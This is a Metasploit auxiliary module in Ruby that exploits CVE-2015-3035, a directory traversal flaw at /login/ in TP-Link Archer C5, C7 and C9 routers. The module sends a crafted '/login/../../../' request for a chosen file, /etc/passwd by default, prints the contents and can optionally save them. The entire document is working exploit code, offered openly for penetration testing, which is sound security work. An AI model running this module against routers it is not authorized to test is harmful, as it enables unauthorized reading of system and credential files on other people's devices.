##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Archer C7 Directory Traversal Vulnerability',
        'Description' => %q{
          This module takes a vulnerability in the PATH_INFO found at /login/. The vulnernability is known to affect TP-Link Archer C5 C7 and C9 routers of varying versions.
        },
        'References' => [
          [ 'BID', '74050 ' ],
          [ 'CVE', '2015-3035' ]
        ],
        'Author' => [ 'Nick Cottrell <ncottrellweb[at]gmail.com>', 'Anna Graterol <annagraterol95[at]gmail.com>', 'Mana Mostaani <mana.mostaani[at]gmail.com>' ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2015-04-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
      )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),
        OptBool.new('SAVE', [false, 'Save the HTTP body', false]),
      ]
    )
  end

  def run_host(_ip)
    uri = normalize_uri('/login/../../../', datastore['FILE'])
    print_status("Grabbing data at #{uri}")
    res = send_request_raw({
      'method' => 'GET',
      'uri' => uri.to_s
    })

    if !res
      print_error('Server timed out')
    elsif res && res.body =~ (/Error 404 requested page cannot be found/)
      print_error('The file doesn\'t appear to exist')
    else
      # We don't save the body by default, because there's also other junk in it.
      # But we still have a SAVE option just in case
      print_good("#{datastore['FILE']} retrieved")
      print_line(res.body)

      if datastore['SAVE']
        p = store_loot(
          'archer_c7.file',
          'application/octet-stream',
          rhost,
          res.body,
          ::File.basename(datastore['FILE'])
        )
        print_good("File saved as: #{p}")
      end
    end
  end
end
